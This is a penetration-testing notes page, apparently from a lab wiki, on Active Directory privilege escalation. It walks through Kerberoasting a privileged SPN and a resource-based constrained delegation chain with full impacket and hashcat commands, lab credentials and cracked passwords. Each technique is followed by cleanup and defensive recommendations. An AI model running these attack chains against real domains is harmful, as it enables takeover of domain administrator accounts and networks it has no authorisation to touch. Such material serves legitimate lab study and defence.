# Windows — Privilege Escalation

## Windows (local)

!!! note "Placeholder"
    This page has not been written yet. Verified content (architecture details, requirements, commands, screenshots, configuration steps) will be added here from official vendor documentation and first-hand lab/deployment notes.

**Planned scope:** Local Windows privilege escalation content (non-AD).

## Active Directory

### Kerberoasting a misconfigured SPN (privileged account)

Kerberoasting exploits a basic fact about how Kerberos service tickets work: **any** authenticated domain account — even a very low-privilege one — can request a service ticket (TGS) for **any** account that has a registered Service Principal Name (SPN), no matter who is asking. Part of that ticket is encrypted with the *target* service account's own password hash rather than the requester's, so it can be pulled down and cracked completely offline, with zero further contact with the domain controller and no account-lockout risk.

- Normally this targets throwaway `svc_*` accounts with old/weak passwords.
- The `Active` box (see [Active (GPP cpassword + Kerberoasting to Domain Admin)](labs.md#active-gpp-cpassword-kerberoasting-to-domain-admin)) has a rarer and far more dangerous version: the SPN `active/CIFS:445` is registered directly on the built-in **Administrator** account, so roasting it hands over a crackable hash for Domain Admin itself.

- Request the ticket with any valid domain credential — here `SVC_TGS`, recovered via GPP cpassword (see [Group Policy Preferences (GPP) cpassword](active-directory.md#group-policy-preferences-gpp-cpassword)):

```bash
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip <dc-ip> -request
```

```javascript
ServicePrincipalName  Name           MemberOf                                                   PasswordLastSet             LastLogon
--------------------  -------------  ---------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb    2018-07-18 15:06:40.351723  2026-08-17 10:16:53.451356

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$...
```

- Crack offline (mode 13100 = Kerberos 5, etype 23, TGS-REP):

```bash
hashcat -m 13100 administrator.kerberoast /usr/share/wordlists/rockyou.txt --force
```

```javascript
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968
```

- Result: `Administrator : Ticketmaster1968` — full Domain Admin, confirmed via `C$` access.
- **Full chain:** see [Active (GPP cpassword + Kerberoasting to Domain Admin)](labs.md#active-gpp-cpassword-kerberoasting-to-domain-admin) in Labs.

!!! tip "Recommendations"
    - Never register an SPN on a privileged/built-in account — audit `setspn -Q */*` output for exactly this.
    - Any account holding an SPN needs a long, random, non-crackable password (or a gMSA, which rotates automatically).
    - Monitor for TGS requests against privileged-account SPNs (event 4769) — Kerberoasting a normal service account is noisy-normal; Kerberoasting `Administrator` should page someone.

### RBCD via GenericAll on a computer object (Support)

**In plain terms:** Resource-Based Constrained Delegation (RBCD) lets computer A say "I trust computer B to act on behalf of any user when talking to me." If you can write that trust relationship yourself — because you control an AD object with enough rights on the target computer — you can point it at a fake computer you made, then use that fake computer to ask the target for a ticket **as Administrator**, with no password or hash for Administrator ever needed.

- BloodHound (or manual ACL review) showed the `support` user's group, `Shared Support Accounts`, holds `GenericAll` on the **domain controller's own computer object** (`DC$`) — full control over the DC's AD object, inherited through group membership.
- **Why `GenericAll` on a computer object matters:** it lets you write *any* attribute on that object, including `msDS-AllowedToActOnBehalfOfOtherIdentity` — the attribute that configures RBCD. Whoever that attribute names gets to impersonate any user (including Administrator) when authenticating to that computer.

- **Step 1** — create a computer account you control (needs `ms-DS-MachineAccountQuota` > 0, default 10 for any domain user):

```bash
impacket-addcomputer -computer-name 'PWN01$' -computer-pass 'Passw0rd123!' -dc-ip <dc-ip> 'support.htb/support:Ironside47pleasure40Watchful'
```

- **Step 2** — why: now that you control `PWN01$`, use the `GenericAll` right to tell the DC to trust `PWN01$` for delegation:

```bash
impacket-rbcd -delegate-from 'PWN01$' -delegate-to 'DC$' -dc-ip <dc-ip> -action write 'support.htb/support:Ironside47pleasure40Watchful'
```

- **Step 3** — why: as the now-trusted `PWN01$` account, ask Kerberos for a ticket to the DC's `cifs` service *as Administrator* (S4U2Self gets a ticket impersonating Administrator to yourself; S4U2Proxy then swaps it for a ticket to the target service, since the DC now trusts `PWN01$` to do exactly that):

```bash
impacket-getST -spn 'cifs/dc.support.htb' -dc-ip <dc-ip> -impersonate Administrator 'support.htb/PWN01$:Passw0rd123!'
```

- **Step 4** — use the ticket to run commands as Administrator (`-target-ip` routes the connection by IP while keeping the FQDN for SPN matching, avoiding a DNS/hosts-file dependency):

```bash
KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache impacket-wmiexec -k -no-pass -dc-ip <dc-ip> -target-ip <dc-ip> dc.support.htb
```

!!! important "Cleanup (mandatory, and verified — not assumed)"
    Remove the delegation right and delete the created computer account, then independently confirm both are gone:

    ```bash
    impacket-rbcd -delegate-from 'PWN01$' -delegate-to 'DC$' -dc-ip <dc-ip> -action remove 'support.htb/support:Ironside47pleasure40Watchful'
    # self-delete may fail for SAMR-created accounts — use the privileged session instead:
    # Remove-ADComputer -Identity PWN01$ -Confirm:$false
    ```

    Verification isn't "the attribute has no bytes" — decode the returned security descriptor and confirm zero DACL entries:

    ```python
    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
    import base64
    sd = SR_SECURITY_DESCRIPTOR(data=base64.b64decode('<attribute-value>'))
    print(len(sd['Dacl'].aces))   # 0 == no delegation configured
    ```

- **Full chain:** see [Support (custom-tool credential leak + RBCD to Domain Admin)](labs.md#support-custom-tool-credential-leak-rbcd-to-domain-admin) in Labs — the RBCD abuse above is reached via the LDAP bind credential recovered by decompiling a custom .NET tool, see [LDAP Bind Credentials](active-directory.md#ldap-bind-credentials).

!!! tip "Recommendations"
    - Audit `GenericAll`/`GenericWrite`/`WriteProperty` grants on computer objects, especially DCs — a nested group ACE is easy to miss in a quick review.
    - Monitor writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` (event 5136 on that attribute).
    - Lower `ms-DS-MachineAccountQuota` to 0 for users who don't need to join computers to the domain.
